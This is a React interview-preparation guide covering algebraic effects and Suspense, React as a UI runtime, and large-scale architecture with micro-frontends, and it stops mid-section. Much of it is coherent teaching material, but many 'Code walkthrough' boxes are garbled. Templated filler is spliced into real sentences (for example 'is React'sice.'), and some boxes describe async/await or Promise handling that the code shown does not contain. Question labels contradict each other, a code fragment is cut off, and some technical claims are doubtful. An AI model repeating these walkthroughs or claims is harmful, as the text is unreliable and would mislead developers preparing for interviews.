...
| # | Keyword | Weight |
|---|---|---|
| 1 | [Algebraic Effects and React Concurrency Model](#algebraic-effects-and-react-concurrency-model) | creator |
| 2 | [React as a UI Runtime](#react-as-a-ui-runtime) | creator |
| 3 | [React Architecture at Scale and Micro-frontends](#react-architecture-at-scale-and-micro-frontends) | architect |
| 4 | [React Security Vulnerabilities and Mitigations](#react-security-vulnerabilities-and-mitigations) | expert |
| 5 | [React Server Components and Suspense](#react-server-components-and-suspense) | expert |
| 6 | [React Fiber Reconciler Internals](#react-fiber-reconciler-internals) | expert |
| 7 | [React Testing Library Patterns](#react-testing-library-patterns) | intermediate |
| 8 | [React Anti-patterns](#react-anti-patterns) | intermediate |
| 9 | [Controlled vs Uncontrolled Components](#controlled-vs-uncontrolled-components) | intermediate |
| 10 | [React Query and Server-State Management](#react-query-and-server-state-management) | intermediate |
| 11 | [React Performance Optimization Techniques](#react-performance-optimization-techniques) | intermediate |
| 12 | [React.memo and Re-render Prevention](#reactmemo-and-re-render-prevention) | intermediate |
| 13 | [React Router and Client-side Routing](#react-router-and-client-side-routing) | working |
| 14 | [Dynamic Routing and Code Splitting](#dynamic-routing-and-code-splitting) | working |
| 15 | [Higher-Order Components](#higher-order-components) | working |
| 16 | [Render Props and Compound Components](#render-props-and-compound-components) | working |

---

# Algebraic Effects and React Concurrency Model

🎯 **Interview Weight:** creator (★★☆) - theoretical underpinning of React's
design; asked at principal level to gauge depth of understanding
...
> Algebraic effects are a theoretical programming concept where
> computations can declare "effects" that are handled by an outer context,
> without the inner computation knowing how. React's Suspense uses a form
> of this: a component "throws" a Promise (the effect), the nearest
> `<Suspense>` boundary "handles" it by showing a fallback, and React
> resumes the component when the Promise resolves. This is also why
> React can "interrupt" renders without explicit thread management.

**3 minutes:**

> In languages with algebraic effects (like Koka, Eff), you can define
> effects and their handlers separately. The effect is declared at the
> call site; the handler is defined by an ancestor context. The computation
> doesn't need to know the handler exists.
>
> React uses a similar concept without true language support. Throwing a
> Promise in a component (Suspense) is effect-like: the component declares
> "I need data" (the effect), the Suspense boundary handles it (suspends
> rendering, shows fallback), React resumes (the effect completes).
>
> React hooks are also related: `useState` and `useEffect` are
> "capabilities" that React provides to components through its execution
> context. The component doesn't own the state - React's scheduler does.
> This is what makes Server Components possible: on the server, hooks
> that are browser-specific (useEffect, useRef with DOM access) can be
> forbidden at the architecture level.

**Blank Mind Recovery:**

**(1) Restate:** "Algebraic effects: computation declares effect, outer context
handles it. React Suspense = throws Promise (effect), Suspense boundary handles it.
Hooks = capabilities provided by React's execution context. This theoretical model
explains why RSC can restrict hooks (server provides different execution context)."
...
Algebraic effects are a theoretical concept in programming language theory
for modeling computational effects (I/O, state, non-determinism, async)
in a principled, composable way. React's design is informed by this model.

**How it works:**

```
// ALGEBRAIC EFFECT PSEUDOCODE (hypothetical language):
effect Async<T> {
  await: Promise<T> -> T
}

// Component declares an effect:
function UserProfile(userId) {
  const user = perform Async.await(fetchUser(userId));
  // Component doesn't know HOW this is handled
  return <div>{user.name}</div>;
}

// Handler (like Suspense boundary) defines behavior:
handle UserProfile with {
  Async.await(promise) {
    // Show fallback while promise pending
    suspend(fallback: <Spinner />, resume: when(promise.resolves))
  }
}

// ACTUAL REACT: Suspense approximates this pattern

// "Performing" the effect = throwing a Promise
function useFetchUser(userId) {
  const cached = cache.get(userId);
  if (cached) return cached;
  throw fetchUser(userId); // "perform Async.await"
}

// "Handler" = Suspense boundary
<Suspense fallback={<Spinner />}>
  {/* Component can "perform" async effects */}
  <UserProfile userId="1" />
</Suspense>

// HOOKS AS EFFECTS:
// React provides different "execution contexts":

// Browser context (Client Component):
function ClientComponent() {
  useState(0);     // React provides state management
  useEffect(() => {}); // React provides side effect scheduling
  useRef(null);    // React provides mutable ref
  // These work because React controls the execution
}

// Server context (Server Component):
async function ServerComponent() {
  // React server execution context:
  // - Allows async/await (equivalent to Async effect)
  // - Does NOT provide useState (no client-side state)
  // - Does NOT provide useEffect (no browser lifecycle)
  // Different execution context -> different available effects
  const data = await db.query('...');
  return <div>{data.name}</div>;
}
```

> **Code walkthrough:** This Algebraic Effects and React Concurrency Model example demonstrates a key concept in practice using async/await. **KEY MECHANISM:** the runtime executes these instructions in sequence with specific memory and execution semantics. **WHY IT MATTERS:** misapplying this pattern causes subtle bugs that only manifest under production load. **TAKEAWAY: understand the execution model before using this pattern in production code.**

**Why it matters:**

Understanding the algebraic effects model explains the "why" behind
React's design choices that seem arbitrary. Why can't you use `useState`
in Server Components? Because Server Components run in a different
execution context that doesn't provide that capability. Why does Suspense
use thrown Promises? Because it approximates an effect system.
...
```jsx
// OBSERVABLE: React's effect-like model in practice

// "Effect" 1: Suspense (async data)
// Throwing a Promise is the "perform" operation
const userCache = new Map();

function fetchUserSuspense(id) {
  if (userCache.has(id)) return userCache.get(id);

  // This is the "effect declaration" - throw a promise
  const promise = fetch(`/api/users/${id}`)
    .then(r => r.json())
    .then(data => { userCache.set(id, data); return data; });

  throw promise; // Fiber catches this, Suspense handles it
}

function UserProfile({ id }) {
  // If not cached, this throws a Promise (the effect)
  const user = fetchUserSuspense(id);
  return <h1>{user.name}</h1>;
}

// "Effect" 2: Error boundaries (error handling)
// Throwing an Error in render = "perform Error effect"
// Error boundary = "handler for Error effect"
class ErrorBoundary extends React.Component {
  state = { error: null };
  static getDerivedStateFromError(error) { return { error }; }
  render() {
    if (this.state.error) return <ErrorFallback />;
    return this.props.children; // "resume" with fallback
  }
}

// Both are instances of the same pattern:
// component "performs" effect -> ancestor "handles" it
```

> **Code walkthrough:** The `fetchUserSuspense` function is React'sice. **KEY MECHANISM:** the runtime executes these instructions in sequence with specific memory and execution semantics. **WHY IT MATTERS:** misapplying this pattern causes subtle bugs that only manifest under production load. **TAKEAWAY: understand the execution model before using this pattern in production code.**
> original Suspense data pattern (now superseded by React Query and RSC,
> but illuminating). When data isn't cached, it throws the Promise. Fiber
> catches the thrown value, checks if it's a Promise (or Promise-like
> with a `.then` method), then finds the nearest Suspense ancestor.
> After the Promise resolves, React re-renders the component - this time
> `userCache.has(id)` is true and the data is returned normally. The
> "effect" (fetch user data) is handled outside the component without
> the component knowing whether it's running in Suspense, Concurrent Mode,
> or being server-rendered.
...
> Algebraic effects are a theoretical concept where computations can
> declare effects that outer contexts handle. React Suspense uses a similar
> idea: a component can "suspend" by throwing a Promise, and the Suspense
> boundary catches it and shows a fallback. This is why Suspense works
> without the component knowing it's inside a Suspense boundary.

**Senior / Staff:**

> The algebraic effects model is the theoretical foundation for React's
> most powerful features. Suspense is effect-as-exception: throw a Promise,
> the nearest handler decides behavior. Error boundaries use the same
> mechanism with thrown Errors. Hooks are effect-as-capability: React's
> execution context provides capabilities (state, effects, refs) that the
> component uses without owning. Server Components demonstrate the model
> most clearly: by changing the execution context (server vs browser),
> React can restrict which hooks are available. The model also explains
> why React Concurrent Mode can interrupt renders: React controls the
> execution context and can defer, restart, or abort work units (fibers).
> This is what distinguishes React's model from "just a rendering library."

---

### ⚖️ Comparison Table

| Concept | Effect | Handler | React Analog |
|---|---|---|---|
| Algebraic effect | `perform Async.await(p)` | `handle ... Async.await` | Suspense |
| Error effect | `perform Error.raise(e)` | `handle ... Error.raise` | Error boundary |
| State effect | `perform State.get/set` | Runtime provides state | useState hook |
| IO effect | `perform IO.write(file)` | Runtime provides IO | Node.js / RSC |

---

### ⚠️ Common Misconceptions

**Misconception 1: Algebraic effects are an official part of JavaScript.**

Algebraic effects are a programming language concept from the typed functional programming research community. They are NOT in JavaScript - they appear in languages like Eff, Koka, and OCaml 5. React's use of the concept is an inspiration for how Suspense works: a component can "throw" a Promise (analogous to raising an effect), and a Suspense boundary above handles it (analogous to an effect handler). The actual JavaScript mechanism is Promise throwing + error boundary-like catching, not algebraic effects in their formal sense.

**Misconception 2: React's Concurrent Mode is fully stable and all legacy behavior is deprecated.**

React 18 made Concurrent Mode opt-in via the new root API (`createRoot`) but maintained backward compatibility. The old `render()` API still works and uses legacy synchronous rendering. `createRoot` enables concurrent features but does not require using them - `startTransition`, `useDeferredValue`, and Suspense are opt-in even with `createRoot`. Existing applications can migrate incrementally without breaking changes.

---

### 🚨 Failure Modes and Diagnosis

**Failure Mode 1: startTransition wrapping synchronous-to-DOM mutations causes deferred UI updates.**

Symptom: wrapping state updates in startTransition makes the UI appear unresponsive; changes are visibly delayed even for simple updates that should be instant. Root cause: `startTransition` marks updates as low-priority; React defers them until higher-priority work is complete. Fix: only use `startTransition` for state updates that produce non-urgent UI changes (search result filtering, sorting) - not for direct user feedback (button click state, input value reflection).

**Failure Mode 2: useDeferredValue causes excessive renders when input changes rapidly.**

Symptom: typing in a search input causes double renders - once for the current input value and once for the deferred value; performance worse than without deferral. Root cause: `useDeferredValue` deliberately renders twice: once with new input (urgent) and once with deferred value (previous input for list rendering). This is the intended behavior, but if the deferred computation is not expensive enough to justify two renders, it's net overhead. Fix: measure; use useDeferredValue only when the deferred component's render is expensive enough to justify the extra render.
...
|---|---------|-----------|
| What are algebraic effects | 3-4 min | Effect + handler separation |
| Suspense as algebraic effects | 4-5 min | Throw = perform |
| Hooks as capabilities | 3-4 min | Execution context |
| Why RSC can ban hooks | 3-4 min | Context restriction |
| Effect systems in PL theory | 4-5 min | Academic grounding |
| How this informs React API design | 4-5 min | Principled model |
| Future: true algebraic effects in JS | 3-4 min | TC39 discussion |
| React without this model | 3-4 min | What would break |
| Compare to Async/Await | 3-4 min | One-shot vs multi-shot |

---

**[JUNIOR] Q1 - [MECHANISM] How does React's Suspense mechanism relate to algebraic effects,**
and why is it not a "true" algebraic effect?** `[PRINCIPAL]` THEORY

> **Answer:**
>
> Suspense approximates algebraic effects but differs in one fundamental
> way: **single-shot vs multi-shot resumption**.
>
> True algebraic effects allow a handler to **resume a computation multiple
> times** from the effect point - the continuation can be invoked repeatedly.
> This enables effects like non-determinism (run once for each possible value)
> or cooperative concurrency (pause and resume N times).
>
> React Suspense only supports **single-shot resumption**: once the Promise
> resolves, the component re-renders once from the top. The "continuation"
> (the rest of the component after the effect point) is not preserved; the
> component function is simply called again.
>
> This distinction matters for Concurrent Mode: React cannot truly "resume"
> a component from the exact point it suspended. It reruns the whole function.
> This is why component render functions must be **idempotent** - they might
> run multiple times before committing to the DOM.
>
> ```
> True algebraic effect (multi-shot):
> component() {
>   const x = perform Effect();  // suspend here
>   // handler resumes HERE with the value
>   // can resume multiple times
>   return render(x);
> }
>
> React Suspense (single-shot, approximate):
> component() {
>   if (!cached) throw promise;  // restart from top when resolved
>   const x = cache.get(key);    // re-executes from beginning
>   return render(x);
> }
> ```
>
> The TC39 proposal for `do { }` expressions and potential future
> "effect typing" in JavaScript would enable closer alignment with
> true algebraic effects. Dan Abramov has written about this in React
> team blog posts.
>
> *What separates good from great:* The single-shot vs multi-shot
> distinction is the precise theoretical limitation of React's model.
> It explains the "render must be pure" constraint: since React might
> re-execute the render function multiple times (on abort, on resume),
> any side effect in render would run multiple times unexpectedly.
...
🎯 **Interview Weight:** creator (★★☆) - Dan Abramov's "React as a UI
Runtime" framing; understanding what React guarantees vs what it doesn't
...
> "React as a UI Runtime" is the mental model that React is not just a
> rendering library but a runtime that manages a UI tree with specific
> contracts: (1) the UI tree is a function of state; (2) React decides
> WHEN and HOW to apply updates to the host (DOM, Native); (3) components
> are descriptions of UI, not imperative DOM mutations. This framing
> explains why React can target multiple hosts (DOM, React Native, server
> streams) with the same component code.

**3 minutes:**

> The "UI Runtime" model has two sides: the React-facing side (components,
> props, state) and the host-facing side (DOM, native views). React is
> the mediator. It receives a description of desired UI (component tree),
> computes what changed (reconciliation), and instructs the host to apply
> the minimal changes (commit). The runtime provides: (1) Identity - React
> tracks which component instance corresponds to which host element across
> renders. (2) State isolation - each component instance has its own state.
> (3) Batching - React groups multiple state updates into single renders
> to avoid thrashing the host. (4) Scheduling - React can delay low-priority
> updates and handle high-priority events first.

**Blank Mind Recovery:**

**(1) Restate:** "React = UI Runtime, not just rendering library. Manages:
identity (same component instance across renders), state isolation, batching
(group updates), scheduling (priority). Targets multiple hosts: DOM, Native,
server. Component = description of UI, not imperative mutation."
...
The UI Runtime model describes React's fundamental contract: given a
description of desired UI (component tree), React manages the mapping
to the actual host environment (DOM, Native, server output) over time.

**How it works:**

```jsx
// IDENTITY: React tracks component instances
// Key is how React identifies instances

function ShoppingCart({ items }) {
  return (
    <ul>
      {items.map(item => (
        // React uses key to maintain identity
        // SAME key -> same component instance (state preserved)
        // DIFFERENT key -> new instance (state reset)
...
// FORCED RESET: change key to force new instance
function UserProfile({ userId }) {
  // When userId changes, key changes -> fresh component instance
  // All state in UserProfile resets - useful for "clean slate" behavior
  return <ProfileForm key={userId} userId={userId} />;
}

// BATCHING: React groups state updates
function Counter() {
  ...
  function handleClick() {
    ...
    // even in async contexts (setTimeout, promises)
    setCount(c => c + 1);
    setIsEven(c => (c + 1) % 2 === 0);
    // One render, not two
  }

  return <button onClick={handleClick}>{count} ({isEven ? 'even' : 'odd'})</button>;
}

// RENDERER ARCHITECTURE: multiple hosts, same components
//
// react-dom:          (browser)
...
// ink:                (terminal/CLI)
// react-server:       (streaming HTML)
//
// All use the same component model:
function Button({ onClick, children }) {
  return <div onClick={onClick}>{children}</div>;
}
// This component is valid in all renderers
// The "div" host element differs per renderer

// CONCURRENT FEATURES AS RUNTIME SCHEDULING:
// React's scheduler manages work priority, not the browser event loop
...
function Search({ items }) {
  ...
  function handleChange(e) {
    ...
    startTransition(() => {
      ...
      ); // NOT URGENT: update list
    });
    // React runtime schedules: input update first, list update deferred
    // Browser main thread remains responsive
  }
...
> **Code walkthrough:** This React as a UI Runtime example demonstrates async/await Promise resolution using React hook. **KEY MECHANISM:** async functions return Promises; await suspends the microtask until the Promise settles. **WHY IT MATTERS:** unhandled Promise rejections crash the Node process in v15+ or fire unhandledRejection event. **TAKEAWAY: always await or .catch() every Promise - silent rejections are production defects.**

**Why it matters:**

The "UI Runtime" mental model explains React's design constraints (pure
renders, declarative not imperative) and capabilities (multi-platform,
scheduling, batching). It's the vocabulary for discussing React's
fundamental architecture at staff/principal level.
...
```jsx
// RUNTIME CONTRACT: what React guarantees

// 1. RENDER PURITY CONTRACT:
// React MAY call your component function multiple times
// (StrictMode, Concurrent features, pre-rendering)
// Your component MUST produce identical output for identical input

// BAD: impure render (side effect)
let renderCount = 0;
function Counter() {
  renderCount++; // Side effect in render
  const [count] = useState(0);
  return <div>Rendered {renderCount} times, count: {count}</div>;
}
// In StrictMode: renders twice, renderCount is wrong
...
// 2. IDENTITY CONTRACT:
// React uses component type + position + key to determine identity
// SAME identity -> update existing instance
// NEW identity -> mount new instance, unmount old

function Example() {
  const [showForm, setShowForm] = useState(true);
  return (
    <div>
      {/* Same position, same type: React updates, state PRESERVED */}
      {showForm ? <ContactForm /> : <ContactForm />}

      {/* Same position, same type, DIFFERENT key: new instance */}
      {showForm ? <ContactForm key="a" /> : <ContactForm key="b" />}
    </div>
  );
}
```

> **Code walkthrough:** The render purity contract is observable inice. **KEY MECHANISM:** the runtime executes these instructions in sequence with specific memory and execution semantics. **WHY IT MATTERS:** misapplying this pattern causes subtle bugs that only manifest under production load. **TAKEAWAY: understand the execution model before using this pattern in production code.**
> StrictMode: React intentionally calls render twice in development to
> surface bugs caused by side effects in render. The identity contract
> is subtle: two `<ContactForm />` components at the same position are
> treated as the same instance (state preserved on re-render). Adding
> different keys makes them distinct instances (state resets). This is
> the React runtime enforcing: "I manage identity, you describe desired UI."
...
> React is not just a library that renders HTML - it's a runtime that
> manages the UI over time. It tracks component identities, batches state
> updates to avoid unnecessary renders, and can work with different
> "host" environments (DOM, React Native, server). Components describe
> what the UI should look like; React decides how to efficiently update
> the host.

**Senior / Staff:**

> The "UI Runtime" framing clarifies what React is responsible for vs
> what it delegates. React is responsible for: identity tracking (which
> component instance maps to which host node), state isolation (each
> instance has its own state), scheduling (priority-based rendering),
> and commit orchestration (atomic DOM updates). React is NOT responsible
> for: what the host operations actually are (DOM vs Native), how
> component logic works, or data fetching. This separation is why
> React Native works: same runtime, different host renderer. The practical
> implication: when you understand React as a runtime, the "rules of hooks"
> (same order every render) make sense - hooks are stored in a linked list
> on the fiber node, indexed by call order. Breaking order breaks the
> runtime's ability to map hook calls to their state.

---

### ⚖️ Comparison Table

| Responsibility | React Runtime | Component | Host Renderer |
|---|---|---|---|
| Identity tracking | Yes | No | No |
| State management | Yes | Reads/writes via hooks | No |
| Scheduling | Yes | No | No |
| DOM/Native updates | No | No | Yes |
| Business logic | No | Yes | No |
| Declarative description | No | Yes | No |

---

### ⚠️ Common Misconceptions

**Misconception 1: React is only for web browsers.**

React is a component and reconciliation model that can target any rendering environment. React DOM targets browser DOM. React Native targets iOS and Android native views. React Ink targets terminal CLI rendering. React Three Fiber targets WebGL/Three.js 3D scenes. React PDF targets PDF generation. The reconciler algorithm is separate from the renderer - `react-reconciler` package enables custom renderers for any host environment that supports a tree of mutable objects.

**Misconception 2: React re-renders are equivalent to DOM updates.**

A React re-render is a JavaScript function call that produces a new virtual element tree. A DOM update is an actual browser DOM mutation (which triggers layout and paint). In a typical React application, the vast majority of re-renders result in ZERO DOM mutations - the virtual tree diff produces no changes. The expensive operation is not the React render; it is the actual DOM mutation and the subsequent browser layout/paint cycle. Profile real DOM operations, not just React render counts.

---

### 🚨 Failure Modes and Diagnosis

**Failure Mode 1: Hydration mismatch between server and client output causes React to re-render the entire tree.**

Symptom: `Warning: Text content did not match. Server: 'X' Client: 'Y'`; full client-side re-render after SSR; performance loss from what should be fast hydration. Root cause: server-rendered HTML differs from client-rendered output; commonly caused by: browser-only APIs (window, localStorage) used during SSR, dynamic values (timestamps, random IDs) that differ between server and client render. Fix: use `useEffect` for browser-only code; use stable deterministic values during SSR; suppress the warning only as a last resort with `suppressHydrationWarning`.

**Failure Mode 2: Rendering an incorrectly large component tree outside the visible viewport.**

Symptom: initial render time is disproportionately long; React Profiler shows thousands of components rendered on initial mount; most rendered components are below the fold or in offscreen tabs. Root cause: entire application tree rendered eagerly including content that is not visible. Fix: use Suspense to defer loading of below-the-fold content; use lazy tabs that only render when activated; virtualize large lists so only visible items render.
...
| Scenario | Time | Key Signal |
|---|---------|-----------|
| React as runtime vs library | 3-4 min | Mediator model |
| Identity and key | 3-4 min | Type + position + key |
| State isolation | 2-3 min | Per-instance state |
| Batching in React 18 | 3-4 min | Auto-batching async |
| Multiple renderers | 3-4 min | Same component, different host |
| Rules of hooks explanation | 3-4 min | Hook linked list |
| Concurrent scheduling | 4-5 min | Runtime as scheduler |
| Pure render requirement | 3-4 min | Multiple-call model |
| How Strict Mode uses this | 3-4 min | Double invoke |

---

**[JUNIOR] Q1 - [MECHANISM] Why do hooks have the "don't call conditionally" rule?**
Explain from a React internals perspective.** `[STAFF]` INTERNALS

> **Answer:**
>
> React stores hook state in a linked list on the fiber node. Each
> hook call (in order) reads from the next node in the list.
>
> ```
> First render:
> useState(0)     -> hooks list: [State(0)] -> returns [0, setter]
> useEffect(fn)   -> hooks list: [State(0), Effect(fn)]
> useState(false) -> hooks list: [State(0), Effect(fn), State(false)]
>
> Call order: hook1, hook2, hook3
>
> Re-render (same order):
> useState(0)     -> reads hooks[0]: State(0) -> correct
> useEffect(fn)   -> reads hooks[1]: Effect(fn) -> correct
> useState(false) -> reads hooks[2]: State(false) -> correct
>
> Re-render (hook1 skipped by conditional):
> // hooks list still has 3 nodes from first render
> useEffect(fn)   -> reads hooks[0]: State(0) -> WRONG! Gets state, not effect
> useState(false) -> reads hooks[1]: Effect(fn) -> WRONG! Gets effect, not state
> ```
>
> The "don't call conditionally" rule ensures the call order matches
> the linked list order on every render. React uses array index (call
> order) as the key to look up hook state, not a name or identifier.
>
> Languages with true algebraic effects avoid this because the effect
> is identified by type, not position. React's linked-list approach
> is a performance optimization (no Map lookup per hook) that trades
> flexibility for speed.
>
> *What separates good from great:* Explaining it's a PERFORMANCE tradeoff,
> not an arbitrary rule. React could use a Map (keyed by an identifier)
> instead of a linked list. That would allow conditional hooks. The linked
> list is O(1) with no allocations per hook call; a Map lookup has higher
> overhead. For components with many hooks, this matters. The rule is the
> price paid for the performance.
...
🎯 **Interview Weight:** architect (★★★) - asked at staff/principal level;
demonstrates ability to design and evolve large React systems
...
> At scale, React architecture problems cluster around: state management
> (too many providers, context re-renders), component boundaries
> (monolithic mega-components), code splitting (bundle size), and team
> coordination (multiple teams sharing one app). Micro-frontends solve
> the team coordination problem by splitting a large app into independently
> deployable React apps. Module Federation (Webpack 5 / Vite) is the
> primary technical implementation: apps share components and state at
> runtime across deployment boundaries.

**3 minutes:**

> Large React app warning signs: (1) Context providers stacked 20 deep
> at the root - every app state change re-renders everything below.
> Fix: Zustand (subscription model) or split contexts by domain.
> (2) "God components" with 2000 lines - break by feature, not by
> technical layer. (3) Prop drilling through 8 levels - composition
> or context. (4) 5MB JS bundle - route splitting + library audit.
>
> Micro-frontends: trade-off is clear. Benefits: team autonomy, independent
> deployment, technology isolation (team A uses React 17, team B uses 18).
> Costs: runtime coordination overhead, shared state complexity, increased
> infrastructure (multiple build systems), debugging across app boundaries.
> Apply only when team coordination is the actual bottleneck, not as
> premature optimization.

**Blank Mind Recovery:**

**(1) Restate:** "Large React problems: context re-renders (Zustand fixes),
mega-components (split by feature), bundle size (code splitting), team
coordination (micro-frontends). Module Federation = runtime component sharing.
MFE trade-off: team autonomy vs complexity. Only for org problems, not
technical ones."
...
React architecture at scale addresses how to structure large applications
that multiple teams work on, how to manage state across many components
without performance degradation, and how to keep bundles manageable
as the app grows.
...
```
// LARGE REACT APP ARCHITECTURE PATTERNS:

// 1. FEATURE-BASED FOLDER STRUCTURE (not technical layers)

// BAD: technical layers (all context in one folder)
src/
  components/
    Button.tsx
    UserCard.tsx
    ProductCard.tsx    // 50 files, hard to navigate
  hooks/
    useUser.ts
    useProducts.ts     // context lost - which hook belongs where?
  contexts/
    UserContext.tsx

// GOOD: feature-based (colocation)
src/
  features/
    users/
      UserCard.tsx
      useUser.ts
      UserContext.tsx
      usersApi.ts       // all user code together
    products/
      ProductCard.tsx
      useProduct.ts
      productsApi.ts    // all product code together
  shared/              // truly shared utilities
    Button.tsx
    useDebounce.ts

// 2. STATE ARCHITECTURE: Zustand for global client state
import { create } from 'zustand';

// Domain-specific store (NOT one giant global store)
...
// No re-render cascade when unrelated state changes
function UserAvatar() {
...
// 3. MICRO-FRONTENDS with Module Federation (Vite)

// App shell (host): vite.config.ts
...
export default {
  plugins: [
    federation({
      name: 'shell',
      remotes: {
        dashboard: 'http://dashboard-app.com/assets/remoteEntry.js',
        catalog: 'http://catalog-app.com/assets/remoteEntry.js',
      },
      shared: ['react', 'react-dom'], // shared at runtime, not duplicated
    })
  ]
};
  ...
  plugins: [
    federation({
      ...
      exposes: {
        ...
        './RevenueChart': './src/components/RevenueChart.tsx',
      },
...
> **Code walkthrough:** BAD pattern: This React Architecture at Scale and Micro-frontends example demonstrates a key concept in practice using async/await. **KEY MECHANISM:** the runtime executes these instructions in sequence with specific memory and execution semantics. **WHY IT MATTERS:** misapplying this pattern causes subtle bugs that only manifest under production load. **WHAT BREAKS: understand the execution model before using this pattern in production code.**

**Why it matters:**

Most React performance and maintainability problems at scale are
architectural. Understanding when to apply micro-frontends (org-scale
problem) vs better state management (technical problem) vs feature-based
structure (maintainability problem) is the staff-level competency.
...
{% raw %}
```jsx
// SCALE FAILURE: Context re-renders
// BAD: one AppContext with everything
...
function AppProvider({ children }) {
  ...
  // ProductCard re-renders when user logs out, even though it
  // only uses cart data
  return (
...
// GOOD: Zustand stores per domain (subscription model)
...
// ProductCard only re-renders when cart changes, not user changes
function ProductCard({ product }) {
  const addItem = useCartStore(s => s.addItem); // specific selector
  return (
    <div>
      {product.name}
...
// SCALE: bundle splitting strategy
// Route-level: always
// Feature flags: lazy load premium features
// Admin: separate chunk (most users never visit)
const AdminPanel = lazy(() => import('./features/admin/AdminPanel'));
const PremiumFeature = lazy(() =>
  user.isPremium ? import('./features/premium/Feature') : import('./Placeholder')
);
```
{% endraw %}

> **Code walkthrough:** The AppContext anti-pattern is pervasive in codebasesice. **KEY MECHANISM:** the runtime executes these instructions in sequence with specific memory and execution semantics. **WHY IT MATTERS:** misapplying this pattern causes subtle bugs that only manifest under production load. **TAKEAWAY: understand the execution model before using this pattern in production code.**
> that grew organically. Every state update (notification arrives, cart
> changes, theme toggles) triggers a re-render of every single component
> that calls `useContext(AppContext)` - potentially hundreds of components.
> Zustand's selector-based subscriptions solve this: `useCartStore(s => s.addIte
> only re-renders when `addItem` changes (which is never, it's a stable
> function). The bundle splitting strategy shows the 80/20 approach: route-level
> splitting first (highest ROI), then lazy-load by user access pattern
...
> For larger React apps, organize code by feature rather than technical
> layer (all components for a feature together). Use code splitting with
> `React.lazy` to keep bundle sizes manageable. Use Zustand or similar
> for state that doesn't need to be in React state. Micro-frontends are
> for very large organizations where teams need to deploy independently.

**Senior / Staff:**

> At scale, React architecture problems are mostly organizational: how
> do teams work independently without stepping on each other? The
> technical solutions map to the team problems: feature-based folder
> structure enables team ownership of a slice; domain-specific Zustand
> stores enable team ownership of state; Module Federation enables
> independent deployment. Micro-frontends should be the LAST solution,
> not the first, because the cost is high (shared dependency conflicts,
> cross-MFE communication, debugging complexity). I've seen teams adopt
> MFE at 20 engineers when they should have adopted at 200+. The correct
> progression: monorepo with shared packages -> feature-based structure
> -> micro-frontends only when deployment independence is genuinely required.
...
MICRO-FRONTEND ARCHITECTURE
  ...
  │  Shell App (host)           │
  │  ┌──────┬──────┬──────────┐ │
  │  │ Nav  │Header│  Auth    │ │ ← Shell manages layout
  │  └──────┴──────┴──────────┘ │
  │  ┌──────────────────────┐   │
  │  │  Remote: Dashboard   │   │ ← Loaded at runtime
  │  │  (separate deploy)   │   │   via Module Federation
  │  └──────────────────────┘   │
  │  ┌──────────────────────┐   │
  │  │  Remote: Catalog     │   │ ← Independent team
  │  │  (separate deploy)   │   │   independent pipeline
  │  └──────────────────────┘   │
  └─────────────────────────────┘
  
  Shared at runtime: React, React-DOM, design system
  NOT duplicated: one copy in browser despite multiple apps
```
...
flowchart TB
    ...
    subgraph Catalog["Catalog MFE"]
        direction TB
        CApp[CatalogApp]
        CSearch[ProductSearch]
    end
    ...
    Shell -->|Module Federation| Dashboard
    Shell -->|Module Federation| Catalog
    Dashboard -.->|shared| Shared
    Catalog -.->|shared| Shared
    Shell -.->|shared| Shared
```

> **Diagram walkthrough:** The shell app is the host that loads remote
> MFEs at runtime via Module Federation URLs. Each MFE is independently
> deployed (separate CI/CD pipeline, separate team, potentially separate
> repo). React and React-DOM are declared as shared dependencies in
> Module Federation config - they load only once in the browser regardless
> of how many MFEs are loaded. This prevents version conflicts and reduces
> bundle duplication. The MFEs communicate through: shared stores, URL
> parameters, custom events, or a shared event bus.

---

### ⚖️ Comparison Table

| Approach | Team autonomy | Complexity | When to use |
|---|---|---|---|
| Feature-based monorepo | Medium | Low | < 5 teams, shared deployment |
| Monorepo with packages | High | Medium | Multiple teams, shared deploy |
| Micro-frontends (MFE) | Very high | High | Independent deployment required |
| Multiple separate apps | Complete | Very high | Completely different user base

---

### 🏛️ System Design

**Design: Scale a React app from 5 to 50 engineers**

```
Phase 1 (5-10 engineers): Establish structure
- Feature-based folder organization
- Shared component library (Storybook)
- TanStack Query for server state
- Zustand for client state (domain stores)
- Route-level code splitting
- Design system foundation

Phase 2 (10-25 engineers): Team boundaries
- Monorepo with workspaces (pnpm/nx)
- packages/ui: shared component library
- packages/api-client: typed API layer
- packages/auth: shared auth logic
- Team "owns" src/features/their-domain/
- Feature flags for independent release cycles

Phase 3 (25-50 engineers): Deployment independence
- Evaluate: do teams NEED independent deployment?
- If yes: Module Federation for highest-coordination areas
- Keep shell app small (routing, nav, auth)
- MFE per major product area (catalog, checkout, dashboard)
- Cross-MFE communication: shared URL state + custom events
- Shared dependency contract: lock react version across all MFEs

Key decision criteria for MFE adoption:
- Different release cadences required? (weekly vs monthly)
- Teams cannot coordinate feature freeze without conflict?
- Want to A/B test different frameworks per area?
- Security/compliance boundary required between areas?

If "no" to all: feature-based monorepo is sufficient.
```
...
**Misconception 1: Micro-frontends are just multiple React
apps rendered on the same page.**

Micro-frontends are an ARCHITECTURAL pattern where different teams
own end-to-end vertical slices of the application - from the UI to
the backend service. Simply splitting a monolithic React app into
multiple smaller React apps and composing them does not deliver the
key benefit: team autonomy. True micro-frontends enable different
teams to: deploy independently (no coordination required), use
different technology stacks (one team React 17, another React 18),
maintain separate CI/CD pipelines, and evolve their code without
breaking other teams. Without the team topology to support it,
micro-frontends add complexity without adding value.

**Misconception 2: Module Federation solves all dependency
sharing problems between micro-frontends.**

Webpack Module Federation allows micro-frontends to share
dependencies (React, ReactDOM) to avoid loading them twice.
But it introduces version coupling: if Host uses React 18.2 and
Remote uses React 18.0, sharing is possible but requires careful
configuration. If Host uses React 17 and Remote uses React 18,
sharing is not safe and both must be loaded. Module Federation
also does not solve: shared design system versioning (each team
may use a different version of the shared component library),
integration testing (still needs a full composition test), or
CSS isolation (styles can leak unless scoped).

**Misconception 3: Feature-based folder structure is always
better than layer-based structure at scale.**

Feature-based structure (`/features/checkout/`, `/features/catalog/`)
collocates related code and is often better for large teams where
each team owns a feature. But it can complicate: shared utilities
that serve multiple features (where do they live?), cross-cutting
concerns like authentication, and enforcing consistent patterns
across features without a central architecture layer. Layer-based
structure (`/components/`, `/services/`, `/hooks/`) is better
understood by new team members and easier to enforce with lint rules.
Many large applications use a hybrid: feature modules for domain
logic, shared layers for utilities.

---

### 🚨 Failure Modes and Diagnosis

**Failure Mode 1: Shared state between micro-frontends becomes
a coordination bottleneck.**

Symptom: micro-frontends need to share user authentication state,
shopping cart, or notifications, requiring synchronization mechanisms;
